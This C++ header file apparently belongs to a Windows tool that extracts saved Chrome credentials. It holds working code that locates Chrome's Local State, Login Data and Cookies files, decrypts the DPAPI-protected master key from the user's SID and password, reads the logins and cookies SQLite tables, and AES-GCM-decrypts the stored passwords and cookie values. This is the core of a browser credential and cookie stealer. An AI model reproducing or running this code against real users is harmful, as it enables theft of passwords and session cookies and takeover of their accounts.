#pragma once
#include <string>
#include <vector>
#include <Windows.h>
#include "sqlite3.h"
#include "CipherHelper.h"
#include "MasterKey.h"
#include "Credentials.h"

#pragma comment(lib, "libsqlite3.lib")

#define ID_DPAPI         "\x44\x50\x41\x50\x49"
#define ID_VERSION_10    "\x76\x31\x30"
#define ID_VERSION_OTHER "\x01\x00\x00\x00"


/*
* Chrome browser auto save username/key
* platform : Windows 10 / 11
* version:104.0.5112.102
* key file is stored at
* C:/Users/%username%/AppData/Local/Google/Chrome/User Data/Local State
* This is json file, master key is located 
* file['os_crypt']['encrypted_key']
* user login info is stored at 
* C:/Users/%username%/AppData/Local/Google/Chrome/User Data/Default/Login Data
* user cookie info is stored at
* C:/Users/%username%/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies
* Luckily, both are sqlite3 database(db) file!
* login password and cookie are encrypted, others(History[db file] and bookmarks[json file]) are plain text
* Luckily, they are encrypted by the same key!
*/

class UserInfo {

public:

	std::string GetUrl()const {
		return m_url;
	}

	std::string GetName()const {
		return m_name;
	}

	std::string GetPassword()const {
		return m_password;
	}

	explicit UserInfo() noexcept {}

	explicit UserInfo(UserInfo &&user) noexcept {
		this->m_url = user.m_url;
		this->m_name = user.m_name;
		this->m_password = user.m_password;
	}

	explicit UserInfo(std::string&& url, std::string&& name, std::string&& psw) noexcept {
		m_url = url;
		m_name = name;
		m_password = psw;
	}

	~UserInfo() {
		m_url = "";
		m_name = "";
		m_password = "";
	};

private:
	std::string m_url;
	std::string m_name;
	std::string m_password;
};

class UserCookie {

public:
	UserCookie() = default;

	UserCookie(std::string&& key, std::string&& value, std::string&& expireTime) {
		m_hostKey = key;
		m_value = value;
		m_expires_utc = expireTime;
	}

	std::string GetHostKey() const noexcept{
		return m_hostKey;
	}

	std::string GetValue()const noexcept {
		return m_value;
	}

	std::string GetExpireTime()const noexcept {
		return m_expires_utc;
	}

private:
	std::string m_hostKey;
	std::string m_value;
	std::string m_expires_utc;
};

class Chrome {

public:

	static std::string GetUserSID() {
		char userName[MAX_PATH] = { 0 };
		char userSID[MAX_PATH] = { 0 };
		char userDomain[MAX_PATH] = { 0 };
		char sid[MAX_PATH] = { 0 };
		DWORD dwName = sizeof(userName);
		DWORD dwSID = sizeof(userSID);
		DWORD dwDomain = sizeof(userDomain);

		SID_NAME_USE sid_user = SidTypeUser;

		GetUserNameA((LPSTR)userName, &dwName);
		LookupAccountNameA(NULL, (LPSTR)userName, (PSID)userSID, &dwSID,
			(LPSTR)userDomain, &dwDomain, &sid_user);
		PSID_IDENTIFIER_AUTHORITY psia = GetSidIdentifierAuthority(userSID);

		dwSID = sprintf(sid, "S-%lu-", SID_REVISION);;
		dwSID += sprintf(sid + strlen(sid), "%-lu", psia->Value[5]);
		int subAuthorities = *GetSidSubAuthorityCount(userSID);
		for (int i = 0; i < subAuthorities; ++i) {
			dwSID += sprintf(sid + dwSID, "-%lu", *GetSidSubAuthority(userSID, i));
		}
		return std::string(sid);
	}

	bool Init(std::string& encBlob, std::string& sid, std::string& password) {
		m_keySize = 0;
		m_decryptKey.clear();
		if (encBlob == "" ) {
			return false;
		}
		bool status = false;
		do {
			int outSize = 0;
			std::string b64Key = SSLHelper::Base64Decode(encBlob, outSize);
			if (b64Key.size() < 128) {
				break;
			}
			if (b64Key.substr(0, 5) != ID_DPAPI) {
				break;
			}
			status = m_credential.Init(b64Key.substr(5).c_str(), outSize - 5);
			if (status == false) {
				break;
			}
			m_masterKey.SetParameter(password, sid);
		} while (false);

		return status;
	}

	bool DecryptKey(const void* keyBuffer, int keySize) {
		bool status = false;
		do {
			status = m_masterKey.Decrypt(keyBuffer, keySize);
			if (status == false) {
				break;
			}
			status = m_credential.Decrypt(m_masterKey.GetMasterKey().data(), m_masterKey.GetMasterKeySize());
			if (status == false) {
				break;
			}
			m_keySize = m_credential.GetBlobSize();
			m_decryptKey.resize(m_keySize);
			memcpy(m_decryptKey.data(), m_credential.GetBlob().data(), m_keySize);
		} while (false);
		return status;
	}

	bool GetUserInfoFromSQL(LPWSTR dbfilePath, std::vector<UserInfo>& res) {
		sqlite3* db = NULL;
		int status = SQLITE_OK;
		do {
			status = sqlite3_open16(dbfilePath, &db);
			if (status != SQLITE_OK) {
				break;
			}
			// select action_url, username_value, password_value from logins
			sqlite3_stmt* stat = NULL;
			const wchar_t* szSql = L"select action_url, username_value, password_value from logins";
			status = sqlite3_prepare16(db, szSql, lstrlenW(szSql) * 2, &stat, 0);
			if (status != SQLITE_OK) {
				break;
			}
			while (SQLITE_ROW == sqlite3_step(stat)) {
				std::string url = std::string((const char*)sqlite3_column_text(stat, 0));
				std::string name = std::string((const char*)sqlite3_column_text(stat, 1));
				if (url != "" && name != "") {
					int pswLength = sqlite3_column_bytes(stat, 2);
					std::string password = std::string((char*)sqlite3_column_text(stat, 2), pswLength);
					password = DecryptInfo(password);
					if (password != "") {
						res.emplace_back(UserInfo(std::move(url), std::move(name), std::move(password)));
					}
				}
			}
		} while (false);
		return status == SQLITE_OK;
	}

	bool GetUserCookieFromSQL(LPWSTR dbfilePath, std::vector<UserCookie>& res) {
		sqlite3* db = NULL;
		int status = SQLITE_OK;
		do {
			status = sqlite3_open16(dbfilePath, &db);
			if (status != SQLITE_OK) {
				break;
			}
			// SELECT host_key,encrypted_value,expires_utc FROM cookies
			sqlite3_stmt* stat = NULL;
			const wchar_t* szSql = L"SELECT host_key,encrypted_value,datetime(expires_utc/1000000-11644473600,'unixepoch','localtime') FROM cookies";
			status = sqlite3_prepare16(db, szSql, lstrlenW(szSql) * 2, &stat, 0);
			if (status != SQLITE_OK) {
				break;
			}
			while (SQLITE_ROW == sqlite3_step(stat)) {
				std::string key = std::string((const char*)sqlite3_column_text(stat, 0));
				int valueLength = sqlite3_column_bytes(stat, 1);
				std::string value = std::string((const char*)sqlite3_column_text(stat, 1), valueLength);
				std::string expireTime = std::string((char*)sqlite3_column_text(stat, 2));
				if (key != "" && expireTime != "") {
					value = DecryptInfo(value);
					if (value != "") {
						res.emplace_back(UserCookie(std::move(key), std::move(value), std::move(expireTime)));
					}
				}
			}
		} while (false);
		return status == SQLITE_OK;
	}

	std::string GetGuid() const {
		return m_credential.GetGUID();
	}

	void Uint() {
		m_decryptKey.clear();
		m_keySize = 0;
	}

	explicit Chrome() {
		m_keySize = 0;
		m_decryptKey.clear();
	}

	~Chrome() {
		Uint();
	}

private:

	std::string DecryptInfo(std::string & info) {
		if (info.size() <= 16) {
			return "";
		}
		if (info.substr(0, 3) != ID_VERSION_10) {
			if (info.substr(0, 4) == ID_VERSION_OTHER) {
				// regard psw as credential!
				bool status = false;
				status = m_credential.Init(info.c_str(), info.size());
				if (status == false) {
					return "";
				}
				status = m_credential.Decrypt(m_masterKey.GetMasterKey().data(), m_masterKey.GetMasterKeySize());
				return m_credential.GetBlob().data();
			}
			else {
				// maybe password is wrong???
				return "";
			}
		}
		else {
			// std::string IV = psw.substr(3, 15);
			// std::string payload(psw.substr(15));
			std::string plain = SSLHelper::AesGCMDecrypt((uint8_t *)info.substr(3).c_str(), info.size() - 3, (uint8_t *)m_decryptKey.data(), m_keySize);
			return plain;
		}
		return "";
	}

private:
	MasterKey m_masterKey;
	Credentials m_credential;
	std::vector<char> m_decryptKey;
	int m_keySize;
};